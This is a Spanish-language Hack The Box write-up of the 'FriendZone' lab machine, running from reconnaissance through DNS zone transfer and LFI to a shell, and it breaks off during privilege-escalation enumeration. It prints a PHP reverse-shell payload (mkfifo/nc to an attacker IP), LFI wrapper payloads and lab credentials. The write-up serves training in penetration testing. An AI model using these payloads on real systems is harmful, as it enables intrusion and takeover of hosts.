---
title: Hack The Box FriendZone
author: k4miyo
date: 2021-12-12
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Linux]
tags: [LFI, DNS Zone Transfer, File Misconfiguration, Web]
ping: true
---

## FriendZone
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.123.

```bash
❯ ping -c 1 10.10.10.123
PING 10.10.10.123 (10.10.10.123) 56(84) bytes of data.
64 bytes from 10.10.10.123: icmp_seq=1 ttl=63 time=146 ms

--- 10.10.10.123 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 146.233/146.233/146.233/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.123 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-05 22:49 CST
Initiating Ping Scan at 22:49
Scanning 10.10.10.123 [4 ports]
Completed Ping Scan at 22:49, 0.16s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 22:49
Scanning 10.10.10.123 [65535 ports]
Discovered open port 22/tcp on 10.10.10.123
Discovered open port 80/tcp on 10.10.10.123
Discovered open port 139/tcp on 10.10.10.123
Discovered open port 21/tcp on 10.10.10.123
Discovered open port 443/tcp on 10.10.10.123
Discovered open port 53/tcp on 10.10.10.123
Discovered open port 445/tcp on 10.10.10.123
Completed SYN Stealth Scan at 22:50, 35.56s elapsed (65535 total ports)
Nmap scan report for 10.10.10.123
Host is up (0.14s latency).
Not shown: 65528 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
139/tcp open  netbios-ssn
443/tcp open  https
445/tcp open  microsoft-ds

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 35.88 seconds
           Raw packets sent: 68540 (3.016MB) | Rcvd: 68453 (2.738MB)

```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.123
   5   │     [*] Open ports: 21,22,53,80,139,443,445
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sC -sV -p21,22,53,80,139,443,445 10.10.10.123 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-05 22:51 CST
Nmap scan report for 10.10.10.123                              
Host is up (0.14s latency).                                                                                                      
                                                                                                                                 
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3    
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                                  
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)                                                                  
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)
53/tcp  open  domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)                                               
| dns-nsid:                                                     
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software         
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
443/tcp open  ssl/http    Apache httpd 2.4.29
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30                                                                                          
|_Not valid after:  2018-11-04T21:02:30
| tls-alpn:         
|_  http/1.1          
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.29 (Ubuntu)  
|_http-title: 404 Not Found                                     
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Hosts: FRIENDZONE, 127.0.0.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -35m00s, deviation: 1h09m16s, median: 4m58s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2021-12-06T06:56:24+02:00
| smb2-time: 
|   date: 2021-12-06T04:56:24
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.44 seconds
```

Vemos el puerto 21 abierto, así que podríamos tratar de ingresar como el usuario `anonymous`; sin embargo, tenemos que no se encuentra habilitado.

```bash
❯ ftp 10.10.10.123
Connected to 10.10.10.123.
220 (vsFTPd 3.0.3)
Name (10.10.10.123:k4miyo): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.
```

Tenemos los puertos 80 y 443 asociados a los servicios HTTP y HTTPS, respectivamente; así que antes de visualizar el contenido vía web, vamos a hacer uso de la herramienta `whatweb` para ver a lo que nos enfrentamos.

```bash
❯ whatweb http://10.10.10.123
http://10.10.10.123 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], Email[info@friendzoneportal.red], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[Friend Zone Escape software]
❯ whatweb https://10.10.10.123
https://10.10.10.123 [404 Not Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.123], Title[404 Not Found]
```

No vemos nada interesante como un gestor de contenido, así que vamos a visualizar el contenido vía web.

![](/assets/images/htb-friendzone/friendzone-web.png)

Si observamos el puerto 443, tenemos que nos muestra un código de estado 404; por lo que podríamos estar pensando en que se está aplicando *virtual hosting*, así que vamos a agregar el dominio `friendzone.red` a nuestro archivo `/etc/hosts` y ahora si podemos visualizar el contenido.

![](/assets/images/htb-friendzone/friendzone-web1.png)

Por el momento no vemos algun panel de login o algo que nos pueda llamar la atención, así que vamos a ver el puerto 445, el cual está abierto, así que podríamos tratar de acceder con una null session y ver si tenemos permisos y bajo que recursos.

```bash
❯ smbmap -H 10.10.10.123
[+] Guest session       IP: 10.10.10.123:445    Name: 10.10.10.123                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        Files                                                   NO ACCESS       FriendZone Samba Server Files /etc/Files
        general                                                 READ ONLY       FriendZone Samba Server Files
        Development                                             READ, WRITE     FriendZone Samba Server Files
        IPC$                                                    NO ACCESS       IPC Service (FriendZone server (Samba, Ubuntu))
❯ smbclient -L 10.10.10.123 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        Files           Disk      FriendZone Samba Server Files /etc/Files
        general         Disk      FriendZone Samba Server Files
        Development     Disk      FriendZone Samba Server Files
        IPC$            IPC       IPC Service (FriendZone server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Tenemos permisos de lectura bajo el directorio `general` y permisos de lectura y escritura bajo el directorio `Development`. Si le echamos un ojo al directorio `general` vemos que contiene un archivo llamado `creds.txt` que ya debe de llamarnos la atención; así que vamos a descargarlo a nuestra máquina de atacante.

```bash
❯ smbmap -H 10.10.10.123 -r general
[+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        general                                                 READ ONLY
        .\general\*
        dr--r--r--                0 Wed Jan 16 14:10:51 2019    .
        dr--r--r--                0 Wed Jan 23 15:51:02 2019    ..
        fr--r--r--               57 Tue Oct  9 18:52:42 2018    creds.txt
❯ smbmap -H 10.10.10.123 --download general/creds.txt
[+] Starting download: general\creds.txt (57 bytes)
[+] File output to: /home/k4miyo/Documentos/HTB/FriendZone/nmap/10.10.10.123-general_creds.txt
❯ cat creds.txt
───────┬───────────────────────────────────────
       │ File: creds.txt
───────┼───────────────────────────────────────
   1   │ creds for the admin THING:
   2   │ 
   3   │ admin:WORKWORKHhallelujah@#
```

Tenemos las credenciales del usuario `admin` que por el momento no sabemos en donde podríamos ocuparlas. Ahora, si checamos el contenido del directorio `Developtment`, vemos que no hay nada; sin embargo, debemos tener presente que tenemos permisos de escritura.

```bash
❯ smbmap -H 10.10.10.123 -r Development
[+] Guest session       IP: 10.10.10.123:445    Name: friendzone.red                                    
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Development                                             READ, WRITE
        .\Development\*
        dr--r--r--                0 Mon Dec  6 20:53:58 2021    .
        dr--r--r--                0 Wed Jan 23 15:51:02 2019    ..
```

Ahora, tenemos el puerto 53 abierto, asociado al servicio de DNS; por lo que ya debemos estar pensando en un ***Domain Zone Transfer***:

```bash
❯ dig @10.10.10.123 friendzone.red
                                
; <<>> DiG 9.16.15-Debian <<>> @10.10.10.123 friendzone.red
; (1 server found)                                                                                                               
;; global options: +cmd                                         
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 60525
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available                                                                                
                                
;; OPT PSEUDOSECTION:                                           
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: d8dd4fbbae8004ea53045f1761aed02d6b374f8ae4176943 (good)
;; QUESTION SECTION:                                            
;friendzone.red.                        IN      A
                                
;; ANSWER SECTION:                                              
friendzone.red.         604800  IN      A       127.0.0.1
                                
;; AUTHORITY SECTION:                                           
friendzone.red.         604800  IN      NS      localhost.

;; ADDITIONAL SECTION: 
localhost.              604800  IN      A       127.0.0.1
localhost.              604800  IN      AAAA    ::1
                                
;; Query time: 164 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: lun dic 06 21:03:31 CST 2021
;; MSG SIZE  rcvd: 154
❯ dig @10.10.10.123 friendzone.red axfr

; <<>> DiG 9.16.15-Debian <<>> @10.10.10.123 friendzone.red axfr
; (1 server found)
;; global options: +cmd
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 140 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: lun dic 06 21:03:43 CST 2021
;; XFR size: 8 records (messages 1, bytes 289)

❯ host -t axfr friendzone.red 10.10.10.123
Trying "friendzone.red"
Using domain server:
Name: 10.10.10.123
Address: 10.10.10.123#53
Aliases: 

;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 39055
;; flags: qr aa; QUERY: 1, ANSWER: 8, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:
;friendzone.red.                        IN      AXFR

;; ANSWER SECTION:
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.         604800  IN      AAAA    ::1
friendzone.red.         604800  IN      NS      localhost.
friendzone.red.         604800  IN      A       127.0.0.1
administrator1.friendzone.red. 604800 IN A      127.0.0.1
hr.friendzone.red.      604800  IN      A       127.0.0.1
uploads.friendzone.red. 604800  IN      A       127.0.0.1
friendzone.red.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800

Received 250 bytes from 10.10.10.123#53 in 140 ms

```

Encontramos varios subdominios asociados al dominio principal `friendzone.red`; así que  vamos a copiarlos y agregarlos a nuestro archivo `/etc/hosts` y posteriormente ver si contenido vía web.

![](/assets/images/htb-friendzone/friendzone-web2.png)

![](/assets/images/htb-friendzone/friendzone-web3.png)

Tenemos que los subdominios `administrator1.friendzone.red` y `uploads.friendzone.red` presentan contenido bajo el puerto 443. Si recordamos, tenemos unas credenciales, por lo que podríamos tratar de usarlas en el panel de login.

![](/assets/images/htb-friendzone/friendzone-web4.png)

Al ingresar, nos dice que visitemos el recurso `/dashboard.php`.

![](/assets/images/htb-friendzone/friendzone-web5.png)

De lo observamos, nos indica que existen los parámetros `imagen_id` y `pagename`; como ejemplo debemos colocar lo siguiente:  `image_id=a.jpg&pagename=timestamp`.

![](/assets/images/htb-friendzone/friendzone-web6.png)

A este punto vemos algo curioso, el parámetro `pagename` el cual nos hace pensar que podemos listar recursos de la máquina, es decir, ***LFI - Local File Inclusion***; por lo que podríamos tratar de ver un recurso interno.

- `pagename=/etc/passwd` - No vemos nada
- `pagename=/etc/hosts` - No vemos nada
- `pagename=dashboard.php` - No vemos nada
- `pagename=dashboard` - Vemos que se interpreta el código php asociado al archivo `dashboard`.

![](/assets/images/htb-friendzone/friendzone-web7.png)

Con esto, podemos pensar que con el parámetro `pagename` podemos visualizar archivos php; por lo que podríamos utilizar wrappers para ver archivos del sistema:

- `pagename=/etc/passwd%00` - No vemos nada.
- `pagename=expect://ls` - No vemos nada.
- `pagename=php://filter/resource=/etc/passwd` -  No vemos nada.
- `pagename=php://filter/convert.base64-encode/resource=/etc/passwd` - No vemos nada.
- `pagename=php://filter/convert.base64-encode/resource=timestamp` - Tenemos una cadena en base 64 del archivo php `timestamp.php`

![](/assets/images/htb-friendzone/friendzone-web8.png)

Copiamos la cadena y la decodificamos:

```bash
❯ echo; echo "PD9waHAKCgokdGltZV9maW5hbCA9IHRpbWUoKSArIDM2MDA7CgplY2hvICJGaW5hbCBBY2Nlc3MgdGltZXN0YW1wIGlzICR0aW1lX2ZpbmFsIjsKCgo/Pgo=" | base64 -d

<?php


$time_final = time() + 3600;

echo "Final Access timestamp is $time_final";


?>

```

Ya vemos el archivo `timestamp.php` y de igual forma, podríamos tratar de ver el archivo `dashboard.php` y para el subdominio `uploads.friendzone.red` ver el archivo `upload.php`.

- `pagename=php://filter/convert.base64-encode/resource=dashboard`

```bash
❯ echo; echo "PD9waHAKCi8vZWNobyAiPGNlbnRlcj48aDI+U21hcnQgcGhvdG8gc2NyaXB0IGZvciBmcmllbmR6b25lIGNvcnAgITwvaDI+PC9jZW50ZXI+IjsKLy9lY2hvICI8Y2VudGVyPjxoMz4qIE5vdGUgOiB3ZSBhcmUgZGVhbGluZyB3aXRoIGEgYmVnaW5uZXIgcGhwIGRldmVsb3BlciBhbmQgdGhlIGFwcGxpY2F0aW9uIGlzIG5vdCB0ZXN0ZWQgeWV0ICE8L2gzPjwvY2VudGVyPiI7CmVjaG8gIjx0aXRsZT5GcmllbmRab25lIEFkbWluICE8L3RpdGxlPiI7CiRhdXRoID0gJF9DT09LSUVbIkZyaWVuZFpvbmVBdXRoIl07CgppZiAoJGF1dGggPT09ICJlNzc0OWQwZjRiNGRhNWQwM2U2ZTkxOTZmZDFkMThmMSIpewogZWNobyAiPGJyPjxicj48YnI+IjsKCmVjaG8gIjxjZW50ZXI+PGgyPlNtYXJ0IHBob3RvIHNjcmlwdCBmb3IgZnJpZW5kem9uZSBjb3JwICE8L2gyPjwvY2VudGVyPiI7CmVjaG8gIjxjZW50ZXI+PGgzPiogTm90ZSA6IHdlIGFyZSBkZWFsaW5nIHdpdGggYSBiZWdpbm5lciBwaHAgZGV2ZWxvcGVyIGFuZCB0aGUgYXBwbGljYXRpb24gaXMgbm90IHRlc3RlZCB5ZXQgITwvaDM+PC9jZW50ZXI+IjsKCmlmKCFpc3NldCgkX0dFVFsiaW1hZ2VfaWQiXSkpewogIGVjaG8gIjxicj48YnI+IjsKICBlY2hvICI8Y2VudGVyPjxwPmltYWdlX25hbWUgcGFyYW0gaXMgbWlzc2VkICE8L3A+PC9jZW50ZXI+IjsKICBlY2hvICI8Y2VudGVyPjxwPnBsZWFzZSBlbnRlciBpdCB0byBzaG93IHRoZSBpbWFnZTwvcD48L2NlbnRlcj4iOwogIGVjaG8gIjxjZW50ZXI+PHA+ZGVmYXVsdCBpcyBpbWFnZV9pZD1hLmpwZyZwYWdlbmFtZT10aW1lc3RhbXA8L3A+PC9jZW50ZXI+IjsKIH1lbHNlewogJGltYWdlID0gJF9HRVRbImltYWdlX2lkIl07CiBlY2hvICI8Y2VudGVyPjxpbWcgc3JjPSdpbWFnZXMvJGltYWdlJz48L2NlbnRlcj4iOwoKIGVjaG8gIjxjZW50ZXI+PGgxPlNvbWV0aGluZyB3ZW50IHdvcm5nICEgLCB0aGUgc2NyaXB0IGluY2x1ZGUgd3JvbmcgcGFyYW0gITwvaDE+PC9jZW50ZXI+IjsKIGluY2x1ZGUoJF9HRVRbInBhZ2VuYW1lIl0uIi5waHAiKTsKIC8vZWNobyAkX0dFVFsicGFnZW5hbWUiXTsKIH0KfWVsc2V7CmVjaG8gIjxjZW50ZXI+PHA+WW91IGNhbid0IHNlZSB0aGUgY29udGVudCAhICwgcGxlYXNlIGxvZ2luICE8L2NlbnRlcj48L3A+IjsKfQo/Pgo=" | base64 -d

<?php

//echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
//echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";
echo "<title>FriendZone Admin !</title>";
$auth = $_COOKIE["FriendZoneAuth"];

if ($auth === "e7749d0f4b4da5d03e6e9196fd1d18f1"){
 echo "<br><br><br>";

echo "<center><h2>Smart photo script for friendzone corp !</h2></center>";
echo "<center><h3>* Note : we are dealing with a beginner php developer and the application is not tested yet !</h3></center>";

if(!isset($_GET["image_id"])){
  echo "<br><br>";
  echo "<center><p>image_name param is missed !</p></center>";
  echo "<center><p>please enter it to show the image</p></center>";
  echo "<center><p>default is image_id=a.jpg&pagename=timestamp</p></center>";
 }else{
 $image = $_GET["image_id"];
 echo "<center><img src='images/$image'></center>";

 echo "<center><h1>Something went worng ! , the script include wrong param !</h1></center>";
 include($_GET["pagename"].".php");
 //echo $_GET["pagename"];
 }
}else{
echo "<center><p>You can't see the content ! , please login !</center></p>";
}
?>

```

- `pagename=php://filter/convert.base64-encode/resource=/var/www/uploads/upload.php` En el cual podemos ver que realmente no se está haciendo nada y podría tratarse de un **Rabbit Hole**.

```bash
❯ echo; echo "PD9waHAKCi8vIG5vdCBmaW5pc2hlZCB5ZXQgLS0gZnJpZW5kem9uZSBhZG1pbiAhCgppZihpc3NldCgkX1BPU1RbImltYWdlIl0pKXsKCmVjaG8gIlVwbG9hZGVkIHN1Y2Nlc3NmdWxseSAhPGJyPiI7CmVjaG8gdGltZSgpKzM2MDA7Cn1lbHNlewoKZWNobyAiV0hBVCBBUkUgWU9VIFRSWUlORyBUTyBETyBIT09PT09PTUFOICEiOwoKfQoKPz4K" | base64 -d

<?php

// not finished yet -- friendzone admin !

if(isset($_POST["image"])){

echo "Uploaded successfully !<br>";
echo time()+3600;
}else{

echo "WHAT ARE YOU TRYING TO DO HOOOOOOMAN !";

}

?>
```

Recapitulando un poco, podemos acceder a recursos php dentro del sistema desde el sitio web y tenemos un directorio en el servicio SMB en el cual contamos con permisos de escritura; así que podríamos tratar de subir un archivo php de prueba.

```php
<?php
        echo "Esto es una prueba";
?>
```

```bash
❯ smbclient //10.10.10.123/Development -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Dec  6 20:53:58 2021
  ..                                  D        0  Wed Jan 23 15:51:02 2019

                9221460 blocks of size 1024. 6460320 blocks available
smb: \> put test.php
putting file test.php as \test.php (0.1 kb/s) (average 0.1 kb/s)
smb: \> dir
  .                                   D        0  Mon Dec  6 21:54:17 2021
  ..                                  D        0  Wed Jan 23 15:51:02 2019
  test.php                            A       37  Mon Dec  6 21:54:18 2021

                9221460 blocks of size 1024. 6460316 blocks available
smb: \>
```

Y ahora, pensando un poco, vemos que el directorio `Files` del servicio SMB se encuentra en la ruta `/etc/Files`; asi que podriamos pensar que el directorio `Development` se encuentra en una ruta similar `/etc/Development`:

- `pagename=/etc/Development/test`

![](/assets/images/htb-friendzone/friendzone-web9.png)

Se nos interpreta nuestro código, así que ahora, vamos a entablarnos una reverse shell:

```php
<?php
        system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 443 >/tmp/f")
?>
```

```bash
❯ smbclient //10.10.10.123/Development -N
Try "help" to get a list of possible commands.
smb: \> put shell.php
putting file shell.php as \shell.php (0.2 kb/s) (average 0.2 kb/s)
smb: \> dir
  .                                   D        0  Mon Dec  6 22:02:58 2021
  ..                                  D        0  Wed Jan 23 15:51:02 2019
  test.php                            A       37  Mon Dec  6 21:54:18 2021
  shell.php                           A       98  Mon Dec  6 22:02:58 2021

                9221460 blocks of size 1024. 6460296 blocks available
smb: \>
```

Nos ponemos en escucha por el puerto 443 y tratamos de ingresar a `https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/shell`:

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.123] 43062
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
$
```

Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt). Para trabajar más cómodos, hacemos un [Tratamiento de la tty](/posts/tratamiento-tty). Ahora nos queda escalar privilegios, por lo que vamos a enumerar un poco el sistema.

Si checamos el directorio de `www-data`, vemos algo interesante, un archivo `mysql_data.conf`, así que vamos a echarle un ojo:

```bash
www-data@FriendZone:/home/friend$ cd /var/www/
www-data@FriendZone:/var/www$ ls -l
total 28
drwxr-xr-x 3 root root 4096 Jan 16  2019 admin
drwxr-xr-x 4 root root 4096 Oct  6  2018 friendzone
drwxr-xr-x 2 root root 4096 Oct  6  2018 friendzoneportal
drwxr-xr-x 2 root root 4096 Jan 15  2019 friendzoneportaladmin
drwxr-xr-x 3 root root 4096 Oct  6  2018 html
-rw-r--r-- 1 root root  116 Oct  6  2018 mysql_data.conf
drwxr-xr-x 3 root root 4096 Oct  6  2018 uploads
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
www-data@FriendZone:/var/www$
```

Tenemos unas credenciales del usuario `friend` supuestamente del servicio `mysql`; sin embargo, la utilidad no se encuentra instalada.

```bash
www-data@FriendZone:/var/www$ which mysql
www-data@FriendZone:/var/www$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
friend:x:1000:1000:friend,,,:/home/friend:/bin/bash
www-data@FriendZone:/var/www$
```

Podríamos pensar que podrían ser las credenciales a nivel de sistema del usuario `friend`, por lo que podríamos probar.

```bash
www-data@FriendZone:/var/www$ su friend
Password: 
friend@FriendZone:/var/www$ whoami
friend
friend@FriendZone:/var/www$
```

Somos el usuario `friend`. Ahora vamos a tratar de convertirnos en el usuario `root`, por lo que enumeraremos un poco el sistema.

```bash
friend@FriendZone:/$ id
uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
friend@FriendZone:/$ sudo -l
[sudo] password for friend: 
friend@FriendZone:/$ find \-perm 4000 2>/dev/null
friend@FriendZone:/$ cd opt/
friend@FriendZone:/opt$ ls -l
total 4
drwxr-xr-x 2 root root 4096 Jan 24  2019 server_admin
friend@FriendZone:/opt$ cd server_admin/
friend@FriendZone:/opt/server_admin$ ls -l
total 4
-rwxr--r-- 1 root root 424 Jan 16  2019 reporter.py
friend@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
friend@FriendZone:/opt/server_admin$
```

Bajo la ruta `/opt/server_admin` nos encontramos con un archivo curioso llamado `reporter.py` cuyo propietario es `root`. Podríamos pensar que el programa se está ejecuntando a intervalos regulares y lo podemos corroborar con la utilidad [pspy](https://github.com/DominicBreuker/pspy).

```bash
❯ cd /opt/pspy
❯ GOOS=linux GOARCH=amd64 go build -ldflags "-s -w" .
❯ du -hc pspy
2.7M    pspy
2.7M    total
❯ upx brute pspy
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2020
UPX 3.96        Markus Oberhumer, Laszlo Molnar & John Reiser   Jan 23rd 2020

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
upx: brute: FileNotFoundException: brute: No such file or directory
   2748416 ->   1059396   38.55%   linux/amd64   pspy                          

Packed 1 file.
❯ du -hc pspy
1.1M    pspy
1.1M    total
```

Transfermimos el archivo `pspy` a la máquina víctima y lo ejecutamos:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.123 - - [06/Dec/2021 22:45:36] "GET /pspy HTTP/1.1" 200 -
```

```bash
friend@FriendZone:/dev/shm$ wget http://10.10.14.27/pspy
--2021-12-07 06:50:34--  http://10.10.14.27/pspy
Connecting to 10.10.14.27:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1059396 (1.0M) [application/octet-stream]
Saving to: ‘pspy’

pspy                             100%[=======================================================>]   1.01M   932KB/s    in 1.1s    

2021-12-07 06:50:35 (932 KB/s) - ‘pspy’ saved [1059396/1059396]

friend@FriendZone:/dev/shm$ chmod +x pspy
friend@FriendZone:/dev/shm$ ./pspy
pspy - version:  - Commit SHA:                                                                                                   
                                                                                                                                 
                                                                                                                                 
     ██▓███    ██████  ██▓███ ▓██   ██▓                                                                                          
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒                                                                                          
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░                                                                                          
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░               
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░        
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒              
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░                                                                                           
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░                                                                                            
                   ░           ░ ░                                                                                               
                               ░ ░                                                                                               
                                                                
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on 
inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...                                                                                    
done                                                            
2021/12/07 06:52:05 CMD: UID=0    PID=98     |            
2021/12/07 06:52:05 CMD: UID=0    PID=9438   |                                                                                   2021/12/07 06:52:05 CMD: UID=0    PID=9      |                                                                                   
2021/12/07 06:52:05 CMD: UID=0    PID=88     |                                                                                   
2021/12/07 06:52:05 CMD: UID=107  PID=853    | /usr/sbin/exim4 -bd -q30m                                                         
2021/12/07 06:52:05 CMD: UID=0    PID=849    | /usr/sbin/smbd --foreground --no-process-group                                    
2021/12/07 06:52:05 CMD: UID=0    PID=844    | /usr/sbin/smbd --foreground --no-process-group                                    
2021/12/07 06:52:05 CMD: UID=0    PID=843    | /usr/sbin/smbd --foreground --no-process-group                                    
2021/12/07 06:52:05 CMD: UID=0    PID=82     |                                                                                   
2021/12/07 06:52:05 CMD: UID=0    PID=81     |                                                                                   
2021/12/07 06:52:05 CMD: UID=0    PID=80     | 
2021/12/07 06:52:05 CMD: UID=0    PID=8      | 
2021/12/07 06:52:05 CMD: UID=0    PID=79     |                                                                                   
2021/12/07 06:52:05 CMD: UID=0    PID=78     | 
2021/12/07 06:52:05 CMD: UID=0    PID=77     |                                                                                   
2021/12/07 06:52:05 CMD: UID=0    PID=741    | /usr/sbin/smbd --foreground --no-process-group 
2021/12/07 06:52:05 CMD: UID=0    PID=7      | 
2021/12/07 06:52:05 CMD: UID=0    PID=6      | 
2021/12/07 06:52:05 CMD: UID=0    PID=565    | /usr/sbin/nmbd --foreground --no-process-group 
2021/12/07 06:52:05 CMD: UID=0    PID=558    | /usr/sbin/apache2 -k start 
2021/12/07 06:52:05 CMD: UID=0    PID=556    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2021/12/07 06:52:05 CMD: UID=0    PID=535    | /usr/sbin/sshd -D 
2021/12/07 06:52:05 CMD: UID=0    PID=533    | /usr/sbin/vsftpd /etc/vsftpd.conf 
2021/12/07 06:52:05 CMD: UID=109  PID=517    | /usr/sbin/named -f -4 -u bind 
2021/12/07 06:52:05 CMD: UID=1000 PID=44084  | ./pspy
2021/12/07 06:52:05 CMD: UID=0    PID=44055  | 
2021/12/07 06:52:05 CMD: UID=0    PID=4      | 
